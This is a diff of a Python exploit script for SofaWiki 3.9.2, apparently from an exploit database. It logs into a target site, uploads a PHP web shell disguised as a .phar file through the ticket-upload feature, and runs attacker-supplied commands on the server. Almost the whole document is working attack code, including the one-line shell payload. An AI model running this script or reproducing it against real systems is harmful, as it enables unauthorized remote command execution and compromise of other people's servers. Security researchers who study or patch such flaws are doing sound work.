@@ -1,9 +1,9 @@
 # Exploit Title: SofaWiki 3.9.2 - RCE (authenticated) via Open Ticket File Upload  Exploit
 # Date: 10/17/2024
-# Exploit Author: Chokri Hammedi
-# Vendor Homepage: https://www.sofawiki.com
-# Software Link: https://www.sofawiki.com/site/files/snapshot.zip
-# Version: 3.9.2
+# Exploit Author: Chokri Hammedi  
+# Vendor Homepage: https://www.sofawiki.com  
+# Software Link: https://www.sofawiki.com/site/files/snapshot.zip  
+# Version: 3.9.2  
 # Tested on: Windows XP
 
 
@@ -12,12 +12,39 @@ import re
 import sys
 
 class SofaWikiExploit:
-    def __init__(self, base_url):
+    def __init__(self, base_url, username, password):
         self.base_url = base_url.rstrip('/')
+        self.username = username
+        self.password = password
         self.session = requests.Session()
 
+    def detect_login_name(self):
+        response = self.session.get(f"{self.base_url}/index.php?action=login")
+        match = re.search(r'name="name" value="([^"]+)"', response.text)
+        if not match:
+            print("\033[91m\033[1m[-] couldn't find the 'name' field. Exiting.\033[0m")
+            sys.exit(1)
+        return match.group(1)
+
+    def login(self):
+        print("\033[93m[*] logging in...\033[0m")
+        login_name = self.detect_login_name()
+        data = {
+            "submitlogin": "Login",
+            "username": self.username,
+            "pass": self.password,
+            "name": login_name,
+            "action": "login"
+        }
+        response = self.session.post(f"{self.base_url}/index.php", data=data)
+        if "Logout" in response.text:
+            print("\033[92m\033[1m[+] Login successful!\033[0m")
+            return True
+        print("\033[91m[-] login failed.\033[0m")
+        return False
+
     def upload_shell(self):
-        print("\033[93m[*] Uploading shell...\033[0m")
+        print("\033[93m[*] uploading shell...\033[0m")
         shell_content = '<?php system($_GET["cmd"]); ?>'
         files = {
             'uploadedfile': ('shell.phar', shell_content, 'application/octet-stream'),
@@ -31,27 +58,26 @@ class SofaWikiExploit:
         response = self.session.post(f"{self.base_url}/index.php?name=special:tickets", files=files)
         match = re.search(r'File (.*?) uploaded', response.text)
         if not match:
-            print("\033[91m[-] Shell upload failed.\033[0m")
+            print("\033[91m[-] shell upload failed.\033[0m")
             sys.exit(1)
         shell_url = f"{self.base_url}/site/files/{match.group(1)}"
-        print(f"\033[92m[+] Shell uploaded: {shell_url}\033[0m")
+        print(f"\033[92m[+] shell uploaded: {shell_url}\033[0m")
         return shell_url
 
-    def execute_commands(self, shell_url, commands):
-        for cmd in commands:
-            print(f"\033[93m[*] Running command: {cmd}\033[0m")
-            response = self.session.get(f"{shell_url}?cmd={cmd}")
-            print("\033[92m[+] Command output:\033[0m")
-            print(f"\033[1m{response.text}\033[0m")
+    def execute_command(self, shell_url, cmd):
+        print(f"\033[93m[*] running command: {cmd}\033[0m")
+        response = self.session.get(f"{shell_url}?cmd={cmd}")
+        print("\033[92m[+] command output:\033[0m")
+        print(f"\033[1m{response.text}\033[0m")
 
 if __name__ == "__main__":
-    if len(sys.argv) < 4:
-        print(f"\033[91mUsage: {sys.argv[0]} <target_url> <cmd1> [cmd2] ...\033[0m")
+    if len(sys.argv) != 5:
+        print(f"\033[91musage: {sys.argv[0]} <target_url> <username> <password> <cmd>\033[0m")
         sys.exit(1)
 
-    target_url = sys.argv[1]
-    commands = sys.argv[2:]
+    target_url, username, password, cmd = sys.argv[1:5]
+    exploit = SofaWikiExploit(target_url, username, password)
 
-    exploit = SofaWikiExploit(target_url)
-    shell_url = exploit.upload_shell()
-    exploit.execute_commands(shell_url, commands)
+    if exploit.login():
+        shell_url = exploit.upload_shell()
+        exploit.execute_command(shell_url, cmd)
